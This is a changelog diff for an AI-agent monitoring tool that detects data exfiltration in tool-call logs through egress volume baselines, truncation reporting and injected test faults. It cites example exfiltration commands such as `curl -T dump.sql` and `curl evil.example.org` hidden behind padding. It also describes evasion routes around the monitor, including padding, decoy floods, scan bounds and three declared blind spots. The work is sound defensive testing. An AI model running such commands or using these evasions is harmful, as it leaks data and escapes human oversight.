@@ -7,6 +7,60 @@ project uses [Semantic Versioning](https://semver.org/).
 ## [Unreleased]
 
 ### Added
+- **Outbound volume per destination** (`egress_volume_spike`): a baseline now
+  learns how many *bytes* each destination receives — mean, deviation, maximum
+  and the number of sessions behind them (`domain_egress_volume`) — and a
+  session is compared against it. Warning past 3σ above the mean, critical past
+  5σ, twice the mean standing in when the baseline never varied, increases only:
+  `Outbound volume to api.internal.example: 2.1 MB (baseline: 5.6 KB ± 262 B, 395.2σ)`
+  It is the only check that can see exfiltration through a channel that is
+  entirely normal: the topology, the call counts and the host name are all
+  unchanged, and only the size of what left is out of place
+- `agent_certify.domains.measure_call()` and `CallEgress`: the destinations of
+  one tool call and the bytes it sent to each — the UTF-8 size of its arguments
+  (compact JSON, sorted keys, so the same call measures the same from any
+  parser), counted once. The literal request bodies named on its command lines
+  (`DATA_OPTIONS`: `curl -d`/`--data*`/`-F`/`--form`/`-T`,
+  `wget --post-data`/`--body-data`, httpie's `key=value`) are reported
+  separately as `data_bytes` — how much of the call was a declared payload —
+  and are **not** added to the outbound size, being already part of the
+  argument text that carried them. Numbers only: no payload, no argument text,
+  nothing of the content is kept
+- **An absolute floor on both volume checks** (`CALL_MIN_DELTA_CALLS` = 10
+  calls, `EGRESS_MIN_DELTA_BYTES` = 10 KiB): a rise is reported only when it
+  also passes the baseline's *maximum* by at least that much, the no-variation
+  "twice the mean" fallback included. Three deviations above a mean of 402
+  bytes is 981 bytes and twice a mean of one call is two calls; neither is a
+  finding, and a check that reports them is one an operator learns to skip.
+  Both are arguments of `AnomalyDetector`, of `SessionWatcher`, and of
+  `agent-certify scan`/`watch` (`--min-call-delta`, `--min-egress-delta`);
+  `0` turns a floor off. On eleven held-out real sessions this removed 5 of 11
+  `call_volume_spike` reports and 1 of 9 `egress_volume_spike` reports, leaving
+  every finding that named a rise of tens of kilobytes or dozens of calls
+- `AgentGraph.egress_bytes`, `.egress_calls`, `.record_egress()` and
+  `.egress_total()`; `Baseline.domain_egress_volume` and
+  `volume("egress", host)`. The Claude Code, CrewAI, LangGraph and MCP-log
+  parsers fill them where they already read destinations, counting one call once
+  even when a log writes its start and its end as two records
+- **`destination_scan_truncated`**: reaching a scan limit is now counted on the
+  call and on the graph (`truncated_scans`, `truncated_network_scans`,
+  `truncation_reasons`, like `skipped_records`) and reported — warning, critical
+  when that call did name a destination. Until now a host that fell past a bound
+  disappeared with no trace, which made the bound a one-line evasion
+- `AnomalyInjector.inject_exfiltration()` (`egress_volume_spike`, warning or
+  worse: 20× the usual data to a destination the baseline knows, changing no
+  node, link or call count at all), `.inject_decoy_flood()`
+  (`destination_scan_truncated`, critical: a host buried behind 220 approved
+  decoys in one command) and `.inject_padding_evasion()` (`new_domain`,
+  critical: a host behind 70 000 characters of padding), plus `.accept_domain()`
+- `AnomalyInjector.inject_file_upload_exfil()` and the `file_upload_exfil`
+  anomaly type: the benchmark's **third blind spot**, `curl -T dump.sql <known
+  host>`. The destination and the call are read; the volume is not, because the
+  log holds the file's name and never its size — a blind spot of the data
+  rather than of the parser, so it is measured and declared instead of estimated
+- `tests/test_egress_volume.py`: the measurement, the bounds, the baseline, the
+  thresholds, every output (JSON, text, Markdown, HTML, OTel, MCP) and the
+  negative twin of each positive case
 - **Shell command egress**: the command line of a shell tool call is now read
   for network destinations, which closes the `shell_domain` blind spot v0.7.0
   shipped and measured. `{"command": "curl -sS collector.example.net/x"}` gives
@@ -52,12 +106,25 @@ project uses [Semantic Versioning](https://semver.org/).
   re-runs every extraction case `tests/test_domains.py` asserts
 
 ### Changed
+- **A string is read whole**, to the 10 MB a parser already allows one record,
+  instead of being cut at 64 KB: `echo <70 000 characters>; curl evil.example.org`
+  reached nobody before and reports a destination now. The URL pattern scans in
+  linear time, and a scheme pre-filter makes the whole scan **faster** than
+  before — a 9.5 MB session parses in 548 ms against 651 ms on v0.7.0 (-16%)
+- `MAX_SCAN_DEPTH` 8 → 32, so an ordinary nested argument object is read rather
+  than counted as truncated; `MAX_STRING_CHARS` 64 KB → 10 MB; new
+  `MAX_HOST_CHARS` (a bare-host value past 512 characters is not a hostname) and
+  `MAX_SHLEX_CHARS` (past 64 KB of command line, segments are split on
+  whitespace instead of lexed — some hundred times faster, and no destination
+  is lost because quotes are stripped either way)
+- `Baseline.volume()` takes a third scope, `"egress"`, and now refuses an
+  unknown scope instead of silently reading the link statistics
+- the injection benchmark covers **14 fault types: 66/66 detected on the eleven
+  covered ones, no false positives**, with three measured blind spots
 - the injection benchmark's `shell_domain` is now an expected *detection*
-  (`new_domain`, critical) rather than an expected miss, and `BLIND_SPOTS` is
-  `("shell_var_domain", "ssh_tunnel_domain")`. The injection itself did not
-  change: it builds the same argument object and passes it to the production
-  extractor, so the row moved on its own — **10 fault types, 48/48 detected on
-  the eight covered ones, no false positives**
+  (`new_domain`, critical) rather than an expected miss. The injection itself
+  did not change: it builds the same argument object and passes it to the
+  production extractor, so the row moved on its own
 - nothing else of a command line is read, kept or transmitted: only host names,
   and only from the arguments of a recognised client. `SECURITY.md` §6 and §1
   are updated in the same change, under the review rule §6 states
